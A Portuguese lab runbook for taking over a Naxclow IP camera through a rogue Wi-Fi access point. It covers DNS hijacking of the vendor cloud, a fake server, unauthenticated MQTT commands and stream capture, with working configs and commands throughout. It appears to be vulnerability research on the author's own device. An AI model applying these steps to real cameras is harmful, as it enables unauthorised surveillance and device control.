# Runbook — Fake Server, AP Isolado (Kali Linux)

Cenário: **AP isolado** (lab controlado). Câmera Naxclow Y2SN, firmware `202601081657`, `devicesCode 5c001502B330`. Ambiente controlado — câmera e servidor próprios.

Prova o vetor **fake server**: a câmera aceita qualquer servidor que se diga o cloud, sem autenticar nada (sem TLS, sem cert pinning). Ver [achados_fakeserver.md](achados_fakeserver.md) e o modelo de ameaça em [todo_cenarios.md](todo_cenarios.md).

Tudo roda numa máquina Linux. O Mac fica só como workstation (git, edição, análise de pcap).


## Atalho — script único ([fakesrv_lab.sh](fakesrv_lab.sh))

Em vez de copiar comando por comando, o script sobe a **Fase 1 a 5** de uma vez. Cada processo roda **em background** gravando num log próprio em [docs/mitm_out/](mitm_out/) (`radio.log`, `hostapd.log`, `dnsmasq.log`, `mosquitto.log`, `mqtt.log`, `server.log`). Sem `tmux`, sem janela pra gerenciar.

```bash
sudo ./scripts/fakesrv_lab.sh up          # Fase 1..5: limpa o rádio, escreve os configs, sobe hostapd/dnsmasq/mosquitto/fake server
sudo ./scripts/fakesrv_lab.sh status      # PID vivo? portas 80/1883/53? últimas linhas de cada log + erros de rádio
sudo ./scripts/fakesrv_lab.sh watch       # tail -f de todos os logs juntos, ao vivo (Ctrl-C sai, não mata nada)
sudo ./scripts/fakesrv_lab.sh logs server # despeja um log (ou todos, sem argumento). 'logs server 0' = log inteiro
sudo ./scripts/fakesrv_lab.sh bundle      # junta logs + status + configs + dmesg num arquivo pra anexar/colar
sudo ./scripts/fakesrv_lab.sh cheat       # passos manuais da Fase 6/7/8
sudo ./scripts/fakesrv_lab.sh down        # mata tudo e restaura a rede (unmask NetworkManager, power_save on)
```

`up --terms` (ou `restart --terms`) também abre **uma janela de terminal por log** (`tail -F`), se você tiver ambiente gráfico — a janela é só visão, fechar não mata o processo.

Ele já roda o checkpoint do `dig` e espera o `AP-ENABLED` sozinho, avisando em amarelo/vermelho se algo falhou. A **Fase 6** (parear a câmera pelo app) continua manual. Depois dela, `fakesrv_lab.sh takeover` faz a **Fase 7** (comandos MQTT + coleta da resposta) e a **Fase 8** (extração do `<id>`, `tcpdump`, `snapshot`/`live`, `extract_mitm_video`) sozinho — `fakesrv_lab.sh cheat` mostra os passos manuais equivalentes.

```bash
sudo ./scripts/fakesrv_lab.sh takeover                    # espera a câmera online, manda 'ir on;reboot', prova stream
sudo ./scripts/fakesrv_lab.sh takeover --no-stream 'ir on'  # só a Fase 7, comando custom
# overrides: TAKEOVER_CMDS='ir on;reboot'  ONLINE_TIMEOUT=180  RESP_WAIT=20  STREAM_SECS=15  P2P_WAIT=30
```

Artefatos ficam em `docs/mitm_out/takeover_<data>.{log,pcap,jpg,mjpg}` (+ frames do `extract_mitm_video`) e entram no `bundle`. O takeover também grava `takeover_<data>_sent.log` (marcadores de envio, em arquivo separado do log do subscriber) e `takeover_<data>_baseline.json` (Device/Info antes dos comandos, pra diff).

Dongle ath9k no lugar da Intel interna: `IFACE=wlan1 sudo ./scripts/fakesrv_lab.sh up`. Outros overrides por env: `AP_IP`, `SSID`, `PASS`, `CHANNEL`, `DEV`.

> Pra mandar os logs aqui pra análise: `sudo ./scripts/fakesrv_lab.sh bundle` gera `docs/mitm_out/report_<data>.txt` com tudo junto (cores removidas). Anexa esse arquivo.

O passo a passo abaixo é a referência do que o script faz (e o que rodar na mão se preferir).

---

## Fase 1 — Rádio limpo + interface com IP fixo

O Wi-Fi aqui é o **Intel CNVi (AX201 / Raptor Lake)** interno, no `iwlwifi`. Ele *anuncia* modo AP (`iw list` → `#{ AP, P2P-client, P2P-GO } <= 1`), mas o firmware **cai** quando uma estação associa ou quando qualquer processo faz scan no mesmo `phy` — o AP fica preso a 1 canal (`#channels <= 1`). É essa a causa de **"o hotspot some da lista"** (ainda não conectei) e **"para de responder"** (já conectei), independente de quantas fases você rodou. Detalhe e mitigações em [O AP cai / some](#o-ap-cai--some).

Esta fase existe pra tirar do `phy0` **tudo** que não seja o AP antes de subir o `hostapd`.

```bash
# 1. mata e MASCARA quem reassume a wlan0 (stop sozinho nao basta: systemd/D-Bus religa)
sudo systemctl stop NetworkManager wpa_supplicant
sudo systemctl mask NetworkManager wpa_supplicant
sudo airmon-ng check kill

# 2. sobras de execucoes anteriores
sudo pkill -f 'hostapd|dnsmasq -C.*fakesrv' 2>/dev/null

# 3. deleta a interface P2P-device que o wpa_supplicant deixa no phy0
#    (ela faz "listen scans" que chutam o AP de 1 canal)
iw dev | awk '/Unnamed/{u=1} /wdev/{w=$2} /type P2P-device/{if(u)print w; u=0}' \
  | while read w; do sudo iw wdev "$w" del; done

# 4. regdomain explicito + radio destravado
sudo rfkill unblock wlan
sudo iw reg set BR

# 5. interface com IP fixo
sudo ip link set wlan0 down
sudo iw dev wlan0 set power_save off
sudo ip addr flush dev wlan0
sudo ip addr add 192.168.50.1/24 dev wlan0
sudo ip link set wlan0 up
sudo iw dev wlan0 set power_save off        # reasserta: link up reabilita o power_save

# 6. confere que so a wlan0 sobrou no phy e nada faz scan
iw dev                     # uma unica interface (wlan0, type managed); sem p2p-dev
pgrep -a wpa_supplicant    # tem que sair VAZIO
```

## Fase 2 — hostapd (o AP WiFi) — Terminal 1

```bash
cat <<'EOF' | sudo tee /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=fakesrv
country_code=BR
ieee80211d=1

hw_mode=g
channel=6

# 802.11n LIGADO e o gatilho mais comum do "Microcode SW error" do iwlwifi em modo AP.
# Comece com n DESLIGADO (54g puro, chato mas estavel). So religue (ieee80211n=1)
# se o AP aguentar cliente + camera sem cair. Ver "O AP cai / some".
ieee80211n=0
wmm_enabled=0
uapsd_advertisement_enabled=0

auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0

wpa=2
wpa_passphrase=fakesrv12345
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP

beacon_int=100
dtim_period=2
EOF

sudo hostapd -dd /etc/hostapd/hostapd.conf 2>&1 | tee docs/mitm_out/hostapd.log
```

`-dd` + `tee` porque o `hostapd` **não loga em syslog por padrão** — se cair sem ninguém olhando o terminal naquele segundo, a causa se perde pra sempre. Com isso fica gravado em [docs/mitm_out/hostapd.log](mitm_out/hostapd.log) pra revisar depois.

Espera `AP-ENABLED`. Deixa aberto. A rede `fakesrv` já aparece no celular.

Se o `hostapd` sair sozinho, ou o SSID sumir depois de aparecer, ou parar de responder quando a câmera/celular conecta → [O AP cai / some](#o-ap-cai--some). Não reinicie o `hostapd` direto: refaça a Fase 1 antes (o `phy` precisa ser limpo de novo).

---

## Fase 3 — dnsmasq (DHCP + desvio DNS) — Terminal 2

```bash
sudo systemctl stop dnsmasq

cat <<'EOF' | sudo tee /etc/dnsmasq.d/fakesrv.conf
interface=wlan0
bind-interfaces
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
address=/naxclow.com/192.168.50.1
address=/naxclow.com.cn/192.168.50.1
log-queries
log-dhcp
EOF

sudo dnsmasq -C /etc/dnsmasq.d/fakesrv.conf -d
```

`-d` = foreground, mostra DHCP e DNS ao vivo. Deixa aberto.

**Checkpoint crítico** (Terminal 3):
```bash
dig @192.168.50.1 v720.naxclow.com +short
```
Tem que responder `192.168.50.1`. Se não → nada adiante funciona.

---

## Fase 4 — mosquitto (controle MQTT)

```bash
cat <<'EOF' | sudo tee /etc/mosquitto/conf.d/fakesrv.conf
listener 1883 0.0.0.0
allow_anonymous true
EOF

sudo systemctl restart mosquitto
ss -tlnp | grep 1883        # confirma LISTEN
```

---

## Fase 5 — Fake server — Terminal 4

```bash
sudo FAKE_SRV_HOST=192.168.50.1 python3 src/a9_naxclow.py -s -v
```
Roda a partir da raiz do repo (`src/` já está aqui, sem subpasta `a9-v720`). `sudo` pela porta 80. `FAKE_SRV_HOST` força o IP certo (auto-detect pega o gateway errado). Deixa aberto.

---

## Fase 6 — Câmera no AP (app V720)

1. Celular conecta no WiFi `fakesrv` (senha `fakesrv12345`).
2. App V720 → parear câmera → escolhe rede `fakesrv`.
3. Câmera reboota, entra no AP, registra.

Câmera já pareada noutra rede: reset dela pro modo AP, refaz o pareise apontando pro `fakesrv`.

**Cascata esperada** (firmware `202601081657`, confirmado na execução de 2026-09-05):
- `dnsmasq.log`: `DHCPACK ... 192.168.50.x  5c:f1:50:04:af:8a` → `query[A] v720.naxclow.com from 192.168.50.x` → `query[A] v720.p2p.naxclow.com from 192.168.50.x` (os dois resolvidos pra 192.168.50.1 pelo wildcard `address=/naxclow.com/`)
- `server.log`: `POST /app/api/ApiSysDevices/getDevInfo?devicesCode=5c001502B330` → `POST .../a9bindingAppDevice?devicesCode=...&userKey=...` (o app vincula a câmera ao cloud falso) → `getDevInfo` de novo, todos `HTTP/1.1 200`
- `mosquitto.log`: `New client connected ... as 5c001502B330` → `SUBSCRIBE ... Naxclow/P2P/Users/Device/sub/5c001502B330` (**o tópico de comandos**) → `PUBLISH ... Naxclow/P2P/Users/Device/Info` + `.../Device/Status`

> Firmware novo **não faz** `getA9ConfCheck` / `Receive registration request` / `Found device` (fluxo do firmware antigo). O caminho é HTTP `getDevInfo`+`a9bindingAppDevice` e daí direto pro MQTT — funciona igual.

Isso é a **prova-raiz**: câmera aceitou cloud falso e ficou escutando comandos MQTT sem autenticação.

> **Importante — o canal TCP/UDP `:6123` (registro P2P) NÃO abre na primeira pareação.** A câmera conecta no MQTT e obedece comando (`Device/Info`, `Device/Status`) **sem** registrar no fake server `:6123`. O `server.log` mostra só os POSTs HTTP do app (sem linha `[TCP-SRV :6123]`). O registro P2P — que popula `/dev/list` e habilita o stream — costuma só acontecer **depois**, quando o app abre o viewer da câmera (ou após um comando/reboot). Por isso o app pode mostrar "sem conexão" logo após o pareamento: é o estado esperado do fluxo atual, não falha de rede/AP. O controle via MQTT (Fase 7) já é a prova de takeover — a Fase 8 (stream) depende desse registro P2P.

**Ciclo de reconexão:** a câmera costuma associar, registrar, mandar `deauth` (reason 3 = LEAVING) sozinha ~20-30 s depois, e reconectar — repetindo. Não é o AP caindo (sem `Microcode SW error` no `radio.log`); parece ser o firmware reciclando a sessão MQTT no estado inicial. Para a Fase 7, mande o comando **enquanto a câmera está online** (veja `PINGREQ` no `mqtt.log` ao vivo).

---

## Fase 7 + 8 — automáticas (`fakesrv_lab.sh takeover`)

Depois que a câmera pareou (Fase 6), num terminal só:

```bash
sudo ./scripts/fakesrv_lab.sh takeover
```

O que ele faz:
1. Sobe um `mosquitto_sub` dedicado (`Naxclow/#`, com timestamp) → `docs/mitm_out/takeover_<data>.log` — **essa é a prova**. Os marcadores de envio vão pra `takeover_<data>_sent.log` (arquivo separado — o fd do `takeover_<data>.log` pertence ao `mosquitto_sub`, que sobrescreve escritas externas).
2. Espera a câmera aparecer no broker (`PINGREQ`/`CONNECT` do `DEV` no `mosquitto.log`, até `ONLINE_TIMEOUT`s).
3. **Fase 7:** captura o **baseline** do `Device/Info` (`takeover_<data>_baseline.json`), publica a sequência `TAKEOVER_CMDS` (default `ir on;reboot`) em `Naxclow/P2P/Users/Device/sub/<DEV>`, e espera `RESP_WAIT`s coletando a resposta da câmera (tópicos `Device/*` ≠ o `/sub/` publicado). No fim, imprime o **diff dos campos do `Device/Info`** (baseline → depois) — ex.: `IrLed: 0 -> 2` prova que a câmera respondeu ao comando.
4. **Fase 8:** espera a câmera voltar do reboot, **aguarda o registro P2P** (`:6123` no `server.log`, até `P2P_WAIT`s — se a câmera não abrir o canal, aborta cedo com mensagem clara em vez de bater 30s no `/dev/list`), tira o `<id>` do `server.log` (fallback `/dev/list`), sobe `tcpdump` filtrando o IP do DHCP, faz `snapshot` + `live` (`STREAM_SECS`s) pelo fake server, e roda `extract_mitm_video.py` no pcap.
5. Lista os artefatos: `takeover_<data>.{log,pcap,jpg,mjpg}` (+ `_sent.log`, `_baseline.json`). Tudo entra no `bundle`.

```bash
sudo ./scripts/fakesrv_lab.sh takeover --no-stream 'ir on'   # só a Fase 7, comando custom
# overrides: TAKEOVER_CMDS='ir on;reboot'  ONLINE_TIMEOUT=180  RESP_WAIT=20  STREAM_SECS=15  P2P_WAIT=30
```

Se o registro P2P (`:6123`) não acontecer, a Fase 8 avisa e para — a Fase 7 sozinha já é a prova de takeover. Para destravar o registro, abra o viewer da câmera uma vez no app V720 (ou rode a Fase 8 depois de um ciclo de reboot).

### Descobrir o comando que destrava o P2P (`p2p_probe.sh`)

O fake server é **reativo**: ele só responde quando a câmera inicia o canal `:6123` (`code 100`). Quem "chama" a câmera é o **app** (ao abrir o viewer) — e esse comando de chamada não está documentado no repo. Para aprendê-lo observando (em vez de chutar), use a sonda passiva:

```bash
sudo ./scripts/p2p_probe.sh           # sobe a sonda (sub MQTT + pcap do :6123)
# no celular: app V720 -> abrir o viewer da câmera -> esperar ~15s
sudo ./scripts/p2p_probe.sh stop      # derruba e mostra o que capturou
```

Ela grava `docs/mitm_out/p2p_probe/mqtt.log` (todos os tópicos, com timestamp) e `6123.pcap` (tráfego do canal). Na saída, ela destaca qualquer tópico MQTT diferente do `sub/<DEV>`/`Status`/`Info` — se aparecer algo tipo `Device/req`/`call`/`invite`, o payload é o comando que falta reproduzir no fake server para a Fase 8 (stream) funcionar de ponta a ponta.

### Na mão (equivalente)

```bash
# Terminal 5 - escuta
BROKER=192.168.50.1 ./scripts/fake_srv_cmd.sh listen | tee docs/mitm_out/mqtt_proof.log
# Terminal 6 - comandos (enquanto a câmera está online)
export BROKER=192.168.50.1 DEV=5c001502B330
./scripts/fake_srv_cmd.sh ir on
./scripts/fake_srv_cmd.sh reboot
# Fase 8: <id> do Terminal 4, navegador do Kali (só depois do registro P2P :6123)
#   http://127.0.0.1/dev/list   e   http://127.0.0.1/dev/<id>/live
sudo tcpdump -i wlan0 -w docs/mitm_out/fakesrv_stream.pcap host 192.168.50.10
python3 scripts/extract_mitm_video.py docs/mitm_out/fakesrv_stream.pcap --out docs/mitm_out/fakesrv
```

---

## Terminais abertos ao mesmo tempo

Com `fakesrv_lab.sh` é **1 terminal**: `up` (fases 1–5, tudo em background) e depois `takeover` (fases 7–8). Na mão são vários:

| # | Roda | Fica |
|---|---|---|
| 0 | `sudo dmesg -w \| grep -iE 'iwlwifi\|wlan0'` | aberto (monitor do rádio, ver Fase 1) |
| 1 | hostapd -dd (com tee pro log) | aberto |
| 2 | dnsmasq -d | aberto |
| 4 | fake server -s | aberto |
| 5 | mqtt listen | aberto |
| 3/6 | dig / comandos | pontual |

## Restaurar a rede depois

```bash
sudo pkill hostapd 2>/dev/null
sudo pkill -f 'dnsmasq -C.*fakesrv' 2>/dev/null
sudo iw dev wlan0 set power_save on
sudo systemctl unmask NetworkManager wpa_supplicant   # desfaz o mask da Fase 1
sudo systemctl start NetworkManager
```
`wpa_supplicant` volta sozinho (o NetworkManager ativa via D-Bus quando precisa) — **desde que você tenha feito o `unmask`**; sem isso o Wi-Fi normal não sobe. Os dois `pkill` evitam a sobra que já aconteceu antes: um `dnsmasq -d` de um teste anterior ficou rodando preso a `wlan0` mesmo depois do `NetworkManager` restaurado — vale conferir com `pgrep -a dnsmasq` depois de restaurar. A P2P-device deletada na Fase 1 é recriada pelo `wpa_supplicant` sozinho.

## Checkpoints (parar e revisar se falhar)

1. **Fase 0** — `iw list` sem `* AP` → placa não faz AP, precisa dongle USB (AR9271 / RT5370 / RTL8812AU).
2. **Fase 3** — `dig` não retorna `192.168.50.1` → DNS não sequestrado, nada adiante funciona.
3. **Fase 6** — câmera não faz `getA9ConfCheck` (DNS), ou trava após `baseinfo` (firmware novo sem `content`) → capturar log `-v` do Terminal 4; pode exigir o fallback de timeout no `__start_live()` (ver ressalva em [achados_fakeserver.md](achados_fakeserver.md)).

---

## O AP cai / some

**Sintoma:** você sobe as fases, conecta celular e câmera no `fakesrv`, e o AP **para de responder** (se já tinha conectado) ou **some da lista de redes** (se ainda não). Acontece com ou sem todas as fases — porque não é o fake server, é o rádio.

**Causa raiz:** o Wi-Fi interno é um **Intel CNVi (AX201, Raptor Lake)** no `iwlwifi`. Ele anuncia modo AP, mas o firmware **dá assert** quando:

- uma estação associa → "parou de responder depois que conectei";
- qualquer processo faz scan no mesmo `phy` → o AP fica travado em 1 canal (`iw list` → `#channels <= 1`), então um scan do NetworkManager, do `wpa_supplicant` ou da interface **P2P-device** chuta o rádio → "sumiu da lista".

Quando o FW cai, o `iwlwifi` reinicia sozinho e a `wlan0` **volta como `managed`** — sem beacon, SSID sumido. Não adianta reiniciar o `hostapd` sem antes limpar o `phy` de novo (Fase 1).

**Confirmar — Terminal 0 (`dmesg -w`), na hora da queda:**
```
iwlwifi 0000:00:14.3: Microcode SW error detected
iwlwifi 0000:00:14.3: Start IWL Error Log Dump
iwlwifi 0000:00:14.3: Hardware error detected, restarting  /  became inaccessible
```
Qualquer uma dessas linhas = firmware caiu, não é erro de config.

**Checagem rápida pós-queda:**
```bash
iw dev wlan0 info | grep type          # virou 'managed' => FW reiniciou
pgrep -a wpa_supplicant                # se voltou, algo desmascarou o servico
dmesg | grep -i 'iwlwifi.*\(error\|restart\|inaccess\)' | tail
```

**Mitigações (fazem aguentar uma demo; não resolvem de vez):**

1. `ieee80211n=0` no `hostapd.conf` (já está na Fase 2) — 11n é o gatilho nº 1 do assert em modo AP no iwlwifi.
2. Serviços **mascarados**, não só parados (Fase 1): `systemctl mask NetworkManager wpa_supplicant`.
3. Deletar a **P2P-device** do `phy0` (Fase 1, passo 3) e conferir `iw dev` — só a `wlan0`, nada mais.
4. `power_save off` reafirmado **depois** do `ip link set wlan0 up`.
5. Menos clientes simultâneos: pareie a câmera primeiro, só depois religue o celular.
6. `channel=6` fixo, nunca `acs`/auto.
7. Nada de scan enquanto o AP roda — não abra `nmcli dev wifi`, `iw dev wlan0 scan`, nem o gerenciador gráfico.

**Solução real — dongle USB com AP estável:**

| Chip | Driver | Nota |
|---|---|---|
| **AR9271** | `ath9k_htc` | mais indolor, só 2.4 GHz |
| RT5370 | `rt2800usb` | só 2.4 GHz |
| RTL8812AU | `8812au` (dkms) | 2.4 + 5 GHz |

Com o dongle, a `wlan0` interna nem entra: o dongle sobe como `wlan1`. Troque `wlan0` → `wlan1` em **todas** as fases (`hostapd` `interface=`, `dnsmasq` `interface=`, `ip addr add`, `tcpdump -i`, os greps de `dmesg`). O resto do runbook é idêntico.

---

## Resumo enxuto

```
0. apt install hostapd dnsmasq mosquitto ... ; repo com fixes
1. wlan0: stop+MASK NM+wpa_supplicant; airmon-ng check kill; pkill sobras;
   deletar P2P-device do phy0; iw reg set BR; power_save off; ip addr add 192.168.50.1/24
   conferir: iw dev = so wlan0 ; pgrep wpa_supplicant vazio
   T0: sudo dmesg -w | grep -iE 'iwlwifi|wlan0'   -> monitor do radio; queda = "Microcode SW error" (ver "O AP cai / some")
2. T1: sudo hostapd -dd hostapd.conf 2>&1 | tee docs/mitm_out/hostapd.log   -> AP-ENABLED
3. T2: sudo dnsmasq -C .../fakesrv.conf -d ; dig -> 192.168.50.1
4. mosquitto restart                                    -> 1883 LISTEN
5. T4: sudo FAKE_SRV_HOST=192.168.50.1 python3 src/a9_naxclow.py -s -v
6. celular no fakesrv -> app manda camera -> registra (ve nos logs)
7+8. sudo ./scripts/fakesrv_lab.sh takeover   (espera camera online -> comandos MQTT -> resposta -> <id> -> tcpdump -> live -> extract)
     na mao: T5 listen + T6 comandos MQTT ; /dev/<id>/live + tcpdump
9. depois: pkill hostapd/dnsmasq -> systemctl unmask+start NetworkManager -> conferir pgrep sem sobras
```
